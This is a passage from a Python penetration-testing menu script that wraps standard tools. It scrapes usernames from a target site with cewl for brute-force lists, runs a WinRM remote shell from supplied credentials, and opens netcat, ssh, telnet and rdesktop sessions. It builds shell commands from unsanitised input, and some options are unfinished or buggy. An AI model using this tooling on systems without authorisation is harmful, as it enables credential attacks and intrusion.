      command("cewl -d 3 -m 5 -w users.txt " + TIP.rstrip(" ") + " 2>&1")
      print("\n[+] Userlist generated via website...")
      for x in range (0,MAX):
         US[x] = linecache.getline("users.txt", x+1)
         US[x] = US[x].rstrip(" ")
         if len(US[x]) < COL3:
            US[x] = padding(US[x], COL3)
      if os.path.exists("/usr/share/ncrack/minimal.usr"):
         command("cat /usr/share/ncrack/minimal.usr >> users.txt 2>&1")
         print("[+] NCrack minimal.usr list added as well...")
      if US[12] != "                          ":
         US[11] = "Some users are not shown!!"
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - pftb IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='60':
      command("pftp " + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - ssh -l USER IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='61':
      command("ssh -l " + USR.rstrip(" ") + " " + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - telnet -l USER IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='62':
      command("telnet -l " + USR.rstrip(" ") + " " + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - nc -l USER IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='63':
      command("nc -l " + USR.rstrip(" ") + " " + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - Windows remote login on port 5985.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='64':
      command('echo "require \'winrm\' " > winshell.rb')
      command('echo "" >> winshell.rb')
      command('echo "conn = WinRM::Connection.new(" >> winshell.rb')
      command('echo "  endpoint: \'http://"' + TIP.rstrip(" ") + '":5985/wsman\', " >> winshell.rb')
      command('echo "  user: \'"' + USR.rstrip(" ") + '"\'," >> winshell.rb')
      command('echo "  password: \'"' + PAS.rstrip(" ") + '"\'," >> winshell.rb')
      command('echo ")" >> winshell.rb')
      command("cat shell.txt >> winshell.rb") # ADD REST WHEN YOU HAVE TIME!!
      command("ruby winshell.rb")
      prompt() 

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - rdesktop - u user -p password -d domain / IP
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='65':
      command("rdesktop -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " " + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='67':
      exit(1)       

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='68':
      exit(1)              
#------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='69':
      exit(1)       



#Eof...	
